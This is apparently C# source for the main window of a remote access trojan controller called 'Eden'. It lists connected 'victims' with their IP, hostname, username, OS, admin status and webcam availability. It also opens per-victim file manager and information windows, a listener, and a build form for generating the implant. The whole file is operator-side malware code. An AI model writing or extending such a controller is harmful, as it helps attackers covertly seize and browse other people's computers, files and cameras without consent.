using System.Reflection.Metadata.Ecma335;
using System.Text.Json;

namespace Eden
{
    public partial class Form1 : Form
    {
        public Client m_clnt;

        public Form1()
        {
            InitializeComponent();
        }

        void ServerMessageReceived(Client clnt, string szVictimID, string[] aMsg)
        {
            if (aMsg[0] == "info")
            {
                if (aMsg[1] == "start")
                {
                    //hello here is the test
                    Dictionary<string, JsonElement> dic = Tools.EZData.JsonStr2Dic(aMsg[2]);
                    string szID = dic["ID"].GetString();

                    Invoke(new Action(() =>
                    {
                        string szIP = dic["IP"].GetString();
                        string szHostname = dic["Hostname"].GetString();
                        string szUsername = dic["Username"].GetString();
                        string szOS = dic["OS"].GetString();
                        int iUid = int.Parse(dic["uid"].GetString());
                        bool bAdmin = dic["admin"].GetBoolean();
                        bool bMonitor = dic["Monitor"].GetBoolean();
                        bool bWebcam = dic["Webcam"].GetBoolean();
                        decimal dPing = dic["Ping"].GetDecimal() + clnt.m_nLattency;
                        string szCPU = dic["CPU"].GetString();

                        ListViewItem item = new ListViewItem(szID);
                        item.SubItems.Add(szIP);
                        item.SubItems.Add(szHostname);
                        item.SubItems.Add(szUsername);
                        item.SubItems.Add(szOS);
                        item.SubItems.Add(iUid.ToString());
                        item.SubItems.Add(bAdmin ? "True" : "False");
                        item.SubItems.Add(bMonitor ? "True" : "False");
                        item.SubItems.Add(bWebcam ? "True" : "False");
                        item.SubItems.Add($"{dPing} ms");
                        item.SubItems.Add(szCPU);

                        ListViewItem x = listView1.FindItemWithText(szID);

                        if (x == null)
                        {
                            Victim v = new Victim();
                            v.m_stVictimInfo = new Victim.stVictimInfo()
                            {
                                ID = szID,
                                IPAddr = szIP,
                                Username = szUsername,
                                OS = szOS,
                                uid = iUid,
                            };

                            item.Tag = v;

                            listView1.Items.Add(item);
                        }
                        else
                        {
                            for (int i = 1; i < item.SubItems.Count; i++)
                                x.SubItems[i].Text = item.SubItems[i].Text;
                        }
                    }));
                }
            }
            else if (aMsg[0] == "disconnect")
            {
                if (aMsg[1] == "victim")
                {
                    Invoke(new Action(() =>
                    {
                        ListViewItem item = listView1.FindItemWithText(aMsg[2]);
                        if (item != null)
                            listView1.Items.Remove(item);
                    }));
                }
            }
        }

        void Disconnect(Client clnt, string szMsg)
        {
            Invoke(new Action(() =>
            {
                MessageBox.Show("You are disconnected to the server.", "Disconnect", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                listView1.Items.Clear();
            }));
        }

        void setup()
        {
            toolStripMenuItem7.Enabled = m_clnt != null;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            frmConnect f = new frmConnect();
            f.ShowDialog();

            Client clnt = f.m_clnt;
            f.Dispose();

            toolStripMenuItem7.Enabled = clnt != null;

            if (clnt == null)
                return;

            m_clnt = clnt;

            clnt.ServerMessageReceived += ServerMessageReceived;
            clnt.SocketDisconnect += Disconnect;
            clnt.SendCommand("user|list");
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            frmListener f = new frmListener();
            f.m_clnt = m_clnt;

            f.Show();
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (Tools.FindForm<frmInformation>(item.Text) != null)
                    continue;

                frmInformation f = new frmInformation();
                f.m_clnt = m_clnt;
                f.szVictimID = item.Text;

                f.Show();
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (m_clnt == null)
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (Tools.FindForm<frmFileMgr>(item.Text) != null)
                    continue;

                frmFileMgr f = new frmFileMgr();
                f.m_clnt = m_clnt;
                f.szVictimID = item.Text;

                f.Show();
            }
        }

        private void toolStripButton1_Click_1(object sender, EventArgs e)
        {
            frmBuild f = new frmBuild();
            f.Show();
        }
    }
}
